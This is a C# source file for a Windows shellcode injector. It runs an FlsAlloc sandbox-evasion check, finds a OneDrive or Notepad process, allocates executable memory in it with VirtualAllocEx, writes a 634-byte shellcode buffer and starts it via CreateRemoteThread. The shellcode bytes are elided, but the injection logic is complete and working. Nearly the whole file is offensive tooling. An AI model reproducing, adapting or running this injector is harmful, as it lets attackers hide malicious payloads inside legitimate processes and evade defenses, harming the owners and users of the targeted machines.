using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll", SetLastError = true)]
static extern IntPtr FlsAlloc(IntPtr callback);
        static void Main(string[] args)
        {
            IntPtr mem = FlsAlloc(IntPtr.Zero);
            if (mem == null)
            {
                return;
            }

            string[] desiredProcs = { "onedrive", "notepad" };
            string tProc = null;
            int tProcId = 0;
            foreach (string dProc in desiredProcs)
            {
                Process[] arrProcs = Process.GetProcessesByName(dProc);
                //Console.WriteLine("[*] arrProcs len: " + arrProcs.Length);
                if (arrProcs.Length > 0)
                {
                    tProc = arrProcs[0].MainModule.FileName;
                    tProcId = arrProcs[0].Id;
                    break;
                } else
                {
                    Console.WriteLine("[!] No target process identified");
                    return;
                }
            }
            
            byte[] buf = new byte[634] { 0xfc,[...]0xd5 };
            int size = buf.Length;

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, tProcId);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)size, 0x3000, 0x40);

            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}